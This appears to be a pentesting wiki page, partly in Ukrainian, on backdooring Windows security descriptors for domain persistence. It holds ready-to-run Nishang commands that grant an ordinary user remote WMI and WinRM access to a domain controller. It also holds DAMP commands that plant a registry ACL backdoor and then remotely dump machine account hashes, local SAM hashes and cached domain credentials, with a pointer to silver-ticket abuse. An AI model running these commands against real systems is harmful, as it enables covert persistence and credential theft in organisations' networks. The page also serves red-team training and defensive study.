# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

Windows security descriptors contain an owner SID, a primary-group SID, a discretionary ACL (DACL) that controls access, and a system ACL (SACL) used mainly for auditing. Security Descriptor Definition Language (SDDL) is the textual representation; an ACE string has the form `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

A security descriptor stores who owns a securable object and which principals are allowed or denied specific rights over it. If an attacker can change a DACL, they may grant a low-privileged principal rights that normally require an administrative role.

This makes narrowly modified descriptors useful for persistence: the account remains outside obvious privileged groups while retaining access to a particular management surface. Preserve the original descriptor before testing so the change can be removed exactly.

### Access to WMI

You can give a user access to **execute remotely WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### Доступ до WinRM

Надайте користувачу доступ до віддаленої кінцевої точки PowerShell/WinRM за допомогою функції Nishang `Set-RemotePSRemoting`:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Віддалений доступ до хешів

DAMP може створити backdoor у registry-ACL, який згодом дозволяє віддалено отримувати хеш облікового запису комп’ютера, локальні SAM-хеші та кешовані доменні облікові дані. Надання цих вузьких прав звичайному обліковому запису — особливо щодо контролера домену — забезпечує потужну persistence без членства у привілейованій групі.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Перегляньте [**Silver Tickets**](silver-ticket.md), щоб дізнатися, як можна використати hash облікового запису комп’ютера Domain Controller.

## References

- [1] [Мова визначення дескриптора безпеки - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Проєкт модифікації дискреційних ACL](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Формат рядка дескриптора безпеки](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
